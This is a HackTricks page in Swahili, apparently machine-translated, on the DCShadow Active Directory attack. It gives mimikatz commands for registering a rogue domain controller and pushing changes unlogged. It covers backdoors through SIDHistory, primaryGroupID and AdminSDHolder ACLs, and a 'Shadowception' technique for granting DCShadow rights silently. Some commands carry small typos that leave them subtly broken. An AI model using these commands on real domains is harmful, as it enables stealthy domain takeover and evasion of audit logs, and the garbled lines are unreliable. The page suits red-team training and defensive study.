{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

Inajisajili **Meneja wa Kikoa** mpya katika AD na inatumia ku **sukuma sifa** (SIDHistory, SPNs...) kwenye vitu vilivyotajwa **bila** kuacha **kumbukumbu** yoyote kuhusu **mabadiliko**. Unahitaji **privileges za DA** na uwe ndani ya **kikoa cha mzizi**.\
Kumbuka kwamba ikiwa utatumia data mbaya, kumbukumbu mbaya sana zitaonekana.

Ili kufanya shambulio unahitaji mifano 2 ya mimikatz. Moja yao itaanzisha seva za RPC kwa ruhusa za SYSTEM (lazima uonyeshe hapa mabadiliko unayotaka kufanya), na mfano mwingine utatumika kusukuma thamani:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Inahitaji DA au sawa" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Kumbuka kwamba **`elevate::token`** haitafanya kazi katika `mimikatz1` session kwani hiyo iliongeza haki za thread, lakini tunahitaji kuongeza **haki za mchakato**.\
Unaweza pia kuchagua na "LDAP" kitu: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Unaweza kusukuma mabadiliko kutoka kwa DA au kutoka kwa mtumiaji mwenye ruhusa hizi za chini:

* Katika **kitu cha domain**:
* _DS-Install-Replica_ (Ongeza/ondoa Replica katika Domain)
* _DS-Replication-Manage-Topology_ (Simamia Topolojia ya Replika)
* _DS-Replication-Synchronize_ (Sawaisha Replika)
* Kitu cha **Sites** (na watoto wake) katika **konteina ya Configuration**:
* _CreateChild and DeleteChild_
* Kitu cha **kompyuta ambacho kimeandikishwa kama DC**:
* _WriteProperty_ (Sio Andika)
* Kitu cha **lengo**:
* _WriteProperty_ (Sio Andika)

Unaweza kutumia [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kutoa ruhusa hizi kwa mtumiaji asiye na haki (kumbuka kwamba hii itacha baadhi ya kumbukumbu). Hii ni ya kikomo zaidi kuliko kuwa na ruhusa za DA.\
Kwa mfano: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Hii inamaanisha kwamba jina la mtumiaji _**student1**_ anapokuwa kwenye mashine _**mcorp-student1**_ ana ruhusa za DCShadow juu ya kitu _**root1user**_.

## Kutumia DCShadow kuunda milango ya nyuma

{% code title="Set Enterprise Admins in SIDHistory to a user" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Badilisha PrimaryGroupID (weka mtumiaji kama mwanachama wa Wasimamizi wa Kikoa)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Badilisha ntSecurityDescriptor ya AdminSDHolder (peana Udhibiti Kamili kwa mtumiaji)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Toa DCShadow ruhusa kwa kutumia DCShadow (hakuna kumbukumbu za ruhusa zilizobadilishwa)

Tunahitaji kuongeza ACEs zifuatazo na SID ya mtumiaji wetu mwishoni:

* Kwenye kituo cha eneo:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Kwenye kituo cha kompyuta ya mshambuliaji: `(A;;WP;;;UserSID)`
* Kwenye kituo cha mtumiaji wa lengo: `(A;;WP;;;UserSID)`
* Kwenye kituo cha Tovuti katika kontena ya Mipangilio: `(A;CI;CCDC;;;UserSID)`

Ili kupata ACE ya sasa ya kitu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Kumbuka kwamba katika kesi hii unahitaji kufanya **mabadiliko kadhaa,** si moja tu. Hivyo, katika **mimikatz1 session** (RPC server) tumia parameter **`/stack` na kila mabadiliko** unayotaka kufanya. Kwa njia hii, utahitaji tu **`/push`** mara moja ili kutekeleza mabadiliko yote yaliyokamatwa kwenye seva ya rogue.

[**Taarifa zaidi kuhusu DCShadow katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki hila za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
